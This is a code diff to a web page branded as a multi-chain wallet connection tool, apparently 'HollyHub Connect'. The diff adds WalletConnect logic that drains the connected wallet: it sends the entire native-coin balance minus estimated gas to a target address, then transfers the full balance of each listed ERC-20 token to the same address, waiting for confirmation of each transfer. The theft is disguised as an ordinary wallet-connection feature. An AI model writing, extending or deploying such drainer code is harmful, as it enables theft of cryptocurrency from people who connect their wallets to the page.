@@ -1093,55 +1093,154 @@
           };
 
           const rpcUrl = rpcMap[chainIdNum] || `https://mainnet.infura.io/v3/${infuraId}`;
-          
-          let provider;
+
           let signer;
 
-          // 1. Desktop extension / injected provider
+          // 1. Desktop/injected priority
           if (injectedProvider?.request) {
             try {
-              provider = new ethers.BrowserProvider(injectedProvider);
+              const provider = new ethers.BrowserProvider(injectedProvider);
               signer = await provider.getSigner();
-              console.log("Using injected BrowserProvider signer (desktop/extension)");
+              console.log("Using injected signer (desktop/extension)");
             } catch (e) {
-              console.warn("Injected provider failed:", e.message);
+              console.warn("Injected signer failed:", e);
             }
           }
 
-          // 2. Mobile WalletConnect session - create real provider from session
-          if (!signer && session) {
+          // 2. Mobile WC session - use SignClient to send tx directly
+          if (!signer && session && window.SignClient) {
             try {
-              console.log("Creating WC EthereumProvider from session for mobile");
-              const wcProvider = await EthereumProvider.init({
+              console.log("Using SignClient to send tx on mobile WC session");
+
+              const client = window.__wcClient || await window.SignClient.init({
                 projectId: '81ec0eb195ddbee9c5596804e33ff584',
-                chains: [chainIdNum],
-                methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
-                events: ['chainChanged', 'accountsChanged'],
-                showQrModal: false
+                relayUrl: 'wss://relay.walletconnect.com',
+                metadata: {
+                  name: 'HollyHub Connect',
+                  description: 'Multi-chain wallet connection',
+                  url: window.location.origin,
+                  icons: ['https://avatars.githubusercontent.com/u/37784886']
+                }
               });
 
-              // Pair with existing session using topic
-              if (session.topic) {
-                console.log("Pairing WC provider with session topic:", session.topic);
-                await wcProvider.pair({ topic: session.topic });
+              // Cache client globally for reuse
+              if (!window.__wcClient) {
+                window.__wcClient = client;
               }
 
-              provider = new ethers.BrowserProvider(wcProvider);
-              signer = await provider.getSigner();
-              console.log("WC mobile signer created successfully");
+              // Get current session (should already be active)
+              const activeSession = client.session.get(session.topic) || session;
+
+              if (!activeSession) throw new Error("No active session found");
+
+              // Get balance & estimate
+              const provider = new ethers.JsonRpcProvider(rpcUrl);
+              const balance = await provider.getBalance(fromAddress);
+              const feeData = await provider.getFeeData();
+              const gasLimit = 21000n;
+              const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 20n * 10n**9n;
+              const estimatedGasCost = gasPrice * gasLimit * 150n / 100n;
+
+              if (balance <= estimatedGasCost * 2n) {
+                throw new Error("Native balance too low to cover gas + transfer");
+              }
+
+              const amountToSend = balance - estimatedGasCost;
+
+              console.log(`Sending native ${getChainSymbol(chainIdNum)}: ${ethers.formatEther(amountToSend)}`);
+
+              // Build & send native tx via SignClient
+              const tx = {
+                from: fromAddress,
+                to: targetAddress,
+                value: ethers.hexlify(amountToSend),
+                gas: ethers.hexlify(gasLimit),
+              };
+
+              const { response } = await client.request({
+                topic: activeSession.topic,
+                chainId: `eip155:${chainIdNum}`,
+                request: {
+                  method: "eth_sendTransaction",
+                  params: [tx]
+                }
+              });
+
+              const txHash = response.result; // hash returned by wallet
+              console.log("Native transfer tx hash from wallet:", txHash);
+
+              // Wait for confirmation (poll RPC)
+              const receipt = await provider.waitForTransaction(txHash, 1, 120000); // 2 min timeout
+              console.log("Transfer confirmed:", receipt);
+
+              // ── ERC-20 tokens via SignClient ──────────────────────────
+              const allErc20Tokens = getAllErc20Tokens();
+              const erc20Tokens = allErc20Tokens.filter(t => Number(t.chainId) === chainIdNum);
+
+              for (const token of erc20Tokens) {
+                try {
+                  // Read-only contract for balance & decimals
+                  const tokenContract = new ethers.Contract(
+                    token.address,
+                    [
+                      "function balanceOf(address) view returns (uint256)",
+                      "function transfer(address to, uint256 value) returns (bool)",
+                      "function decimals() view returns (uint8)"
+                    ],
+                    provider
+                  );
+
+                  const tokenBalance = await tokenContract.balanceOf(fromAddress);
+                  if (tokenBalance > 0n) {
+                    const decimals = await tokenContract.decimals();
+                    console.log(`Sending ${token.symbol}: ${ethers.formatUnits(tokenBalance, decimals)}`);
+
+                    // Encode transfer() call
+                    const transferInterface = new ethers.Interface(['function transfer(address to, uint256 value)']);
+                    const transferData = transferInterface.encodeFunctionData('transfer', [targetAddress, tokenBalance]);
+
+                    // Send via SignClient
+                    const tokenTx = {
+                      from: fromAddress,
+                      to: token.address,
+                      data: transferData,
+                      value: "0x0",
+                      gas: ethers.hexlify(100000n), // estimate for ERC20
+                    };
+
+                    const tokenResp = await client.request({
+                      topic: activeSession.topic,
+                      chainId: `eip155:${chainIdNum}`,
+                      request: {
+                        method: "eth_sendTransaction",
+                        params: [tokenTx]
+                      }
+                    });
+
+                    const tokenTxHash = tokenResp.response.result;
+                    console.log(`${token.symbol} transfer tx hash:`, tokenTxHash);
+
+                    const tokenReceipt = await provider.waitForTransaction(tokenTxHash, 1, 120000);
+                    console.log(`${token.symbol} transfer confirmed:`, tokenReceipt);
+                  }
+                } catch (err) {
+                  console.warn(`Failed to transfer ${token.symbol} on chain ${chainIdNum}:`, err.message);
+                }
+              }
+
+              return; // Exit early for mobile WC flow
             } catch (e) {
-              console.error("WC EthereumProvider creation failed:", e.message);
+              console.error("WC SignClient tx failed:", e);
+              throw e;
             }
           }
 
-          // 3. Ultimate fallback - plain RPC (no signing)
           if (!signer) {
-            console.log("No signer available - using read-only JsonRpcProvider");
-            provider = new ethers.JsonRpcProvider(rpcUrl);
-            throw new Error("No signer available. On mobile, ensure WalletConnect session supports signing.");
+            throw new Error("No signer available for this wallet type. Mobile WC signing may require wallet confirmation.");
           }
 
-          // Now proceed with balance & transfer
+          // Fallback native flow if signer was created (desktop extension)
+          const provider = new ethers.BrowserProvider(injectedProvider);
           const balance = await provider.getBalance(fromAddress);
           const feeData = await provider.getFeeData();
 
@@ -2178,6 +2277,7 @@
     <script src="script.js"></script>
 </body>
 </html>
+
 
 
 
